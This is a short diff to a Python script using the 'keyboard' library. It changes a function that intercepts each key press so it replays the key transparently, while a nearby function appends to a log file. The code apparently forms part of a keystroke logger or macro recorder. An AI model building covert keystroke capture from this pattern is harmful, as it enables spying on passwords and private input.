@@ -14,7 +14,11 @@ evento = threading.Event()
 
 
 def recording():
-    return keyboard.read_event(suppress=True)
+    msg = keyboard.read_event(suppress=True)
+    l = list()
+    l.append(msg)
+    keyboard.play(l)
+    return msg
 
 def writeToFileRaw(lPath, lName, l):    
     newLog = open(lPath + lName, "a")
